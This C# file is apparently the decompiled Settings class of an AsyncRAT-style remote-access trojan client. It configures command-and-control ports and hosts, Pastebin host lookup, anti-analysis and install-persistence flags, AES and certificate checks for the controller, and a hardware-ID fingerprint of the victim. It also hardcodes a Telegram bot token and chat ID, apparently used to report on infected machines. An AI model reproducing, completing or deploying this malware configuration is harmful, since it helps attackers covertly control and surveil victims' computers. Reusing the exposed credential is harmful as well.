using System;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using Client.Algorithm;
using Client.Helper;

namespace Client;

public static class Settings
{
	public static string TelegramToken;

	public static string TelegramChatID;

	public static string Ports;

	public static string Hosts;

	public static string Version;

	public static string Install;

	public static string InstallFolder;

	public static string InstallFile;

	public static string Key;

	public static string MTX;

	public static string Certificate;

	public static string Serversignature;

	public static X509Certificate2 ServerCertificate;

	public static string Anti;

	public static Aes256 aes256;

	public static string Pastebin;

	public static string BDOS;

	public static string Hwid;

	public static string Delay;

	public static string Group;

	public static bool InitializeSettings()
	{
		try
		{
			Key = Encoding.UTF8.GetString(Convert.FromBase64String(Key));
			aes256 = new Aes256(Key);
			TelegramToken = TelegramToken;
			TelegramChatID = TelegramChatID;
			Ports = Ports;
			Hosts = Hosts;
			Version = Version;
			Install = Install;
			MTX = MTX;
			Pastebin = Pastebin;
			Anti = Anti;
			BDOS = BDOS;
			Group = Group;
			Hwid = HwidGen.HWID();
			Serversignature = aes256.Decrypt(Serversignature);
			ServerCertificate = new X509Certificate2(Convert.FromBase64String(aes256.Decrypt(Certificate)));
			return VerifyHash();
		}
		catch
		{
			return false;
		}
	}

	private static bool VerifyHash()
	{
		try
		{
			return ((RSACryptoServiceProvider)ServerCertificate.PublicKey.Key).VerifyHash(Sha256.ComputeHash(Encoding.UTF8.GetBytes(Key)), CryptoConfig.MapNameToOID("SHA256"), Convert.FromBase64String(Serversignature));
		}
		catch (Exception)
		{
			return false;
		}
	}

	static Settings()
	{
		TelegramToken = "5039894731:AAGxVYzlbMGEYOhrmidvSWLhE9ROzgzgULQ";
		TelegramChatID = "-1001642607531";
		Ports = "6606,7707,8808";
		Hosts = "127.0.0.1";
		Version = "";
		Install = "false";
		InstallFolder = "%AppData%";
		InstallFile = "";
		Key = "bjRqelhSbEd3aE1wWjRvdWlwZHFBMTZVTlZRVGpuUlc=";
		MTX = "AsyncMutex_6SI8OkPnk";
		Certificate = "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";
		Serversignature = "v2tv3hGuA1zNMWo6978GfuK7vCoC12vSS/pgK78VgVKwo4zAPsnE2FSTVnKmN4xqW3YR45b26wnOAa0gNEDFCslngdn+oSCPVB9KJObyYjjkd+hErBtJQlPP8a/bzod3LGZ6wyNYLI743v7QkJ7uJeyXTIEerhqKTWFx1crkJCVEYrKtVhjzesdtycmpIJ+Uq13XCRhBSW7Us0SziDpgnk3+1YJadU0xKjTM9nEuU2JYDTbNw8zEoCrIGxITxwioGqnLfpLxacmeRh2cRCUHnN1m4Iw+Vo0GY7ZC1+pqkV1iOhFWskSJnvVDh8p1zabvfOZiaXZTp+n5oXhmNoiWaHkDG6muvrNkyFKQ78aZb1mVAZbXp2NQi+yt4uvxm2ffVLFaiWz2kVRHPGSwXX4bnkm41T7v5hmuKGD3MJlVAXiA5S821IlnnPyIYi5Li0pUUL9dD9ypdXloIgzlCas8rR/rqLgAr3Gxqmr0UMvGrzfZmmE1rjlozZ5gz9UH6iBl9p2x5rnPePRBQ/78Dh+6fpQ7zheKIEOM+j5f9MNPsVwu0VI/B9jJUaGQcHe0hYnk2eensG/vjNsF1MHpKxsKgFuOlunkTgdRqjsD7ecj2dv+IYv8EeXKZPY2Ly1rsShtxEJ1E5g/3x2QNawF26VcltMHhZXFcgs046JAShchRecPuJv5rgwTe06hGEQVAXRrzNghAdkS9+tAqh866/wG3lodUuKbHX/BXHr17nrEGwKEfC8lm5ADbhYpSPPVDyTLLn4MqPxSeccW+2RUTuNXTbBj73s6UhlXrepfyrNjwIKbyROiTcWrHWL/CVMTx9YIaHBSWuedo19+SJO8KlIx7O9Pnw3CY6hngkEhrd+JAvaMfAe51Pua6rPRQDndAmHjmPfPgTGokfVhfEcwDItO7m1ScnQrUt/fZoARA1pB+w1NbF7jzHFgMMAwZhcNKSnV0z1PjqNKZRD2F8X84YyJHg==";
		Anti = "false";
		Pastebin = "null";
		BDOS = "false";
		Hwid = null;
		Delay = "0";
		Group = "Default";
	}
}
